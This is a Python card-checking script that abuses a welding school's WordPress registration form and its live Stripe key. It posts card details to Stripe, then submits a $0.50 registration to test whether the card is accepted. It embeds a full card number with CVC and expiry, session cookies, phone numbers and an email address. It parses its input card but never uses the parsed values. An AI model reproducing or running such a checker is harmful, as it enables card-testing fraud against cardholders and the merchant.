import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'type=card&card[number]=4340762013977141&card[cvc]=278&card[exp_month]=06&card[exp_year]=28&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F58c31ec645%3B+stripe-js-v3%2F58c31ec645%3B+card-element&referrer=https%3A%2F%2Fmissouriweldinginstitute.com&time_on_page=100819&client_attribution_metadata[client_session_id]=ace75521-8b6d-4f44-971d-ee3d12e4415c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=1d2b3fb1-a6a0-4938-8a59-86d4b74c6e28&key=pk_live_51FF13SGQCUXegXqO948S1EBdRmGXkJR2BkvmUgFMxwWCKiEtB4s6Ebj21dUkmGWjgFyy6htDWcFmCOBEk8kbIFz400KaPxqwAL'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '__cf_bm': 'SHKV3kH.O94i2hP8.3Rzgb4zx.4pUvA3oA8n_Bdfe0w-1776547064.0261467-1.0.1.1-s6JHbgBM_7dUVYSEpSPI_e_Q5RgVK4G.wquSgkv3O1txfstmo4QLodkmb5ExN94n8UoKTg7l80DHlJsk1KCSo1Au2jtgeW8r_.2_U7OfRK0M8SmYD0SOC6yQNmezMeLx',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_first_add': 'fd%3D2026-04-18%2021%3A17%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
	    '_ga': 'GA1.1.989745671.1776547067',
	    '_tt_enable_cookie': '1',
	    '_ttp': '01KPH79XX093D0FWBH87CCZE44_.tt.1',
	    'cookieyes-consent': 'consentid:Rmljdlh3cndCUkRVV0xNN1NVdmEwbUZ6QXlUaUNDZlA,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
	    '__stripe_mid': '4e6384fb-31d9-4633-bed3-1c3b561dce4b91ad88',
	    '__stripe_sid': 'ed7046e8-a6f1-4340-8fc5-3db2c6d8de3a1c1ecd',
	    'sbjs_current_add': 'fd%3D2026-04-18%2021%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F',
	    'ttcsid_D34TFH3C77U4SLSELMV0': '1776547067826::jEY-y5ff_fxzKgX6D29m.1.1776547225912.1',
	    'ttcsid': '1776547067829::wsN4TRqvn7XyG79gmNzV.1.1776547225913.0::1.56546.58684::158090.32.359.1799::146738.54.1316',
	    '_ga_B546DCHQPE': 'GS2.1.s1776547066$o1$g1$t1776547225$j60$l0$h0',
	    '_gcl_au': '1.1.1920938075.1776547067.1328555406.1776547226.1776547226',
	    '_ga_5F62Q797TY': 'GS2.1.s1776547067$o1$g1$t1776547226$j60$l0$h2058526088',
	}
	
	headers = {
	    'authority': 'missouriweldinginstitute.com',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__cf_bm=SHKV3kH.O94i2hP8.3Rzgb4zx.4pUvA3oA8n_Bdfe0w-1776547064.0261467-1.0.1.1-s6JHbgBM_7dUVYSEpSPI_e_Q5RgVK4G.wquSgkv3O1txfstmo4QLodkmb5ExN94n8UoKTg7l80DHlJsk1KCSo1Au2jtgeW8r_.2_U7OfRK0M8SmYD0SOC6yQNmezMeLx; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2026-04-18%2021%3A17%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.989745671.1776547067; _tt_enable_cookie=1; _ttp=01KPH79XX093D0FWBH87CCZE44_.tt.1; cookieyes-consent=consentid:Rmljdlh3cndCUkRVV0xNN1NVdmEwbUZ6QXlUaUNDZlA,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; __stripe_mid=4e6384fb-31d9-4633-bed3-1c3b561dce4b91ad88; __stripe_sid=ed7046e8-a6f1-4340-8fc5-3db2c6d8de3a1c1ecd; sbjs_current_add=fd%3D2026-04-18%2021%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F; ttcsid_D34TFH3C77U4SLSELMV0=1776547067826::jEY-y5ff_fxzKgX6D29m.1.1776547225912.1; ttcsid=1776547067829::wsN4TRqvn7XyG79gmNzV.1.1776547225913.0::1.56546.58684::158090.32.359.1799::146738.54.1316; _ga_B546DCHQPE=GS2.1.s1776547066$o1$g1$t1776547225$j60$l0$h0; _gcl_au=1.1.1920938075.1776547067.1328555406.1776547226.1776547226; _ga_5F62Q797TY=GS2.1.s1776547067$o1$g1$t1776547226$j60$l0$h2058526088',
	    'origin': 'https://missouriweldinginstitute.com',
	    'referer': 'https://missouriweldinginstitute.com/test/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1776547226788',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=4777&_fluentform_8_fluentformnonce=f7f8954bd5&_wp_http_referer=%2Ftest%2F&user_type=teacher&student_phone=%2B66817480690&teacher_name%5Bfirst_name%5D=John&teacher_name%5Blast_name%5D=Nina&teacher_phone=%2B14303000850&teacher_email=yellhtetgaung210618%40gmail.com&number_of_students=1&student_name_1%5Bfirst_name_1%5D=Lack&student_name_1%5Blast_name_1%5D=Bok&student_grade_1=12&student_welding_hours_1=High%20School&registration_fee=0.5&payment_method=stripe&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '8',
	}
	
	response = requests.post(
	    'https://missouriweldinginstitute.com/wp-admin/admin-ajax.php',
	    params=params,
	    #cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
